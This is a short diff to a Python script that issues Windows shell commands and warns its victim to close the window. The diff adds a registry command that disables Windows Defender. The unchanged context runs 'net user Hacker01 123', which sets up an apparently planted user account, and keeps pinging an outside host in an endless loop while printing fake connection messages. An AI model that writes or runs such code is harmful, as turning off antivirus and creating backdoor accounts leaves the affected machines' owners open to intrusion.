@@ -2,6 +2,7 @@ import time
 import os
 print("I warned you! wait 5 secs or close window if this is ur pc.")
 time.sleep(5)
+os.system('reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
 os.system('dir /s >nul')
 os.system('ping heckersite.ct8.pl')
 print("Connected to remote server")
@@ -36,3 +37,4 @@ os.system("net user Hacker01 123")
 os.getcwd()
 while True:
   os.system("ping heckersite.ct8.pl")
+  print("Tested connection to server.")
